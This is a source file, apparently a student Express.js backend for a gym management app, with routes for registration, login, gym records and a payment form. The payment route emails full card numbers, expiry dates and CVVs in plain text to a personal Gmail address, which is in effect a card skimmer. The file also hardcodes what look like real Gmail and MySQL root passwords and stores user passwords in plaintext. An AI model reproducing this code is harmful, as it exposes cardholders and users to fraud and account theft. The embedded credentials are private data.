const express = require("express");
const bodyParser = require("body-parser");
const mysql = require("mysql");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();
const port = 3001;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ limit: "50mb", extended: true }));
app.use(bodyParser.urlencoded({ extended: true }));

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "laphp46@gmail.com",
    pass: "laphp@12344321",
  },
});

// MySQL Connection
const connection = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "Ijse@1234",
  database: "sgm",
});

const pool = mysql.createPool({
  connectionLimit: 10,
  host: "localhost",
  user: "root",
  password: "Ijse@1234",
  database: "sgm",
});

connection.connect((err) => {
  if (err) throw err;
  console.log("Connected to MySQL database");
});

// POST route for handling form submission
app.post("/submit-form", (req, res) => {
  const { cardHolderName, cardNumber, expiryMonth, expiryYear, cvv } = req.body;

  // Construct email message
  const mailOptions = {
    from: "laphp46@gmail.com",
    to: "danujagreru@gmail.com", // Change this to the owner's email
    subject: "New Payment Form Submission",
    text: `
      Cardholder Name: ${cardHolderName}
      Card Number: ${cardNumber}
      Expiry Month: ${expiryMonth}
      Expiry Year: ${expiryYear}
      CVV: ${cvv}
    `,
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Error sending email:", error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent:", info.response);
      res.status(200).send("Email sent successfully");
    }
  });
});

// Routes
// POST route to handle user registration
app.post("/register", (req, res) => {
  const {
    username,
    firstName,
    secondName,
    lastName,
    telephone,
    email,
    userType,
    nicNumber,
    password,
    profilePic,
  } = req.body;

  let role = "";
  if (userType === "owner") {
    role = "owner";
  } else if (userType === "member") {
    role = "member";
  }

  const sql = `INSERT INTO users (username, first_name, second_name, last_name, telephone, email, role, nic, password, profile_pic) 
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;
  const values = [
    username,
    firstName,
    secondName,
    lastName,
    telephone,
    email,
    role,
    nicNumber,
    password,
    profilePic,
  ];

  // Execute the SQL query
  pool.query(sql, values, (err, result) => {
    if (err) {
      console.error("Error executing query:", err);
      res.status(500).json({ error: "Internal server error" });
    } else {
      res.status(201).json({ message: "User registered successfully" });
    }
  });
});

app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // Check if the username and password are provided
  if (!username || !password) {
    return res
      .status(400)
      .json({ message: "Please provide username and password" });
  }

  // Query the database to check if the user exists and the password is correct
  pool.query(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    [username, password],
    (error, results) => {
      if (error) {
        console.error("Error:", error);
        return res.status(500).json({ message: "Internal server error" });
      }

      // If no user found with the given credentials, return an error
      if (results.length === 0) {
        return res
          .status(401)
          .json({ message: "Invalid username or password" });
      }

      // Extract user role from the database results'[=]
      console.log(results[0]);
      const { id, role } = results[0];
      console.log(results);

      const data = {
        id,
        role,
      };

      // Send the user role back to the client
      res.status(200).json({ data });
    }
  );
});

app.get("/user-id", (req, res) => {
  const { userId } = req.query;

  // Query to fetch the user's ID based on their role
  const query = "SELECT id FROM users WHERE userId = ?";
  connection.query(query, [userId], (error, results) => {
    if (error) {
      console.error("Error executing query:", error);
      res.status(500).json({ error: "Internal server error" });
      return;
    }

    // Check if the user with the given role exists
    if (results.length === 0) {
      res.status(404).json({ error: "User not found" });
      return;
    }

    // Extract the user's ID from the query results
    const userId = results[0].id;

    // Send the user's ID in the response
    res.json({ userId });
  });
});

// Endpoint to add gym details
app.post("/add-gym", (req, res) => {
  console.log(req.body);
  const { gymCategory, address, gymPhotoUrl, gymName, userId } = req.body;

  // Insert gym details into the gyms table
  const query =
    "INSERT INTO gyms (gym_category, gym_location, gym_photo_url, gym_name, user_id) VALUES (?, ?, ?, ?, ?)";
  connection.query(
    query,
    [gymCategory, address, gymPhotoUrl, gymName, userId],
    (error, results) => {
      if (error) {
        console.error("Error executing query:", error);
        res.status(500).json({ error: "Internal server error" });
        return;
      }

      // If insertion is successful, send success response
      res.status(201).json({ message: "Gym details added successfully" });
    }
  );
});

app.get("/gyms", (req, res) => {
  const { userId } = req.query;

  if (userId) {
    const sql = "SELECT * FROM gyms WHERE user_id = ?";

    console.log("userId: ", userId);
    pool.query(sql, [userId], (err, results) => {
      if (err) {
        console.error(err);
        res.status(500).json({ message: "Internal server error" });
      } else {
        res.json(results);
      }
    });
  } else {
    const sql = "SELECT * FROM gyms";
    pool.query(sql, (err, results) => {
      if (err) {
        console.error(err);
        res.status(500).json({ message: "Internal server error" });
      } else {
        res.json(results);
      }
    });
  }
});

// Express route to update gym details
app.put("/update-gym", async (req, res) => {
  try {
    const { id, gym_name, gym_location, gym_category } = req.body;
    console.log(req.body);

    // Construct the SQL query
    const sqlQuery = `
      UPDATE gyms 
      SET 
        gym_name = ?,
        gym_location = ?,
        gym_category = ?
      WHERE 
        id = ?
    `;

    // Execute the SQL query
    pool.query(
      sqlQuery,
      [gym_name, gym_location, gym_category, id],
      (error, results) => {
        if (error) {
          console.error("Error updating gym details:", error);
          res.status(500).json({ message: "Failed to update gym details" });
        } else if (results.affectedRows === 0) {
          res.status(404).json({ message: "Gym not found" });
        } else {
          res.status(200).json({ message: "Gym details updated successfully" });
        }
      }
    );
  } catch (error) {
    console.error("Error updating gym details:", error);
    res.status(500).json({ message: "Failed to update gym details" });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
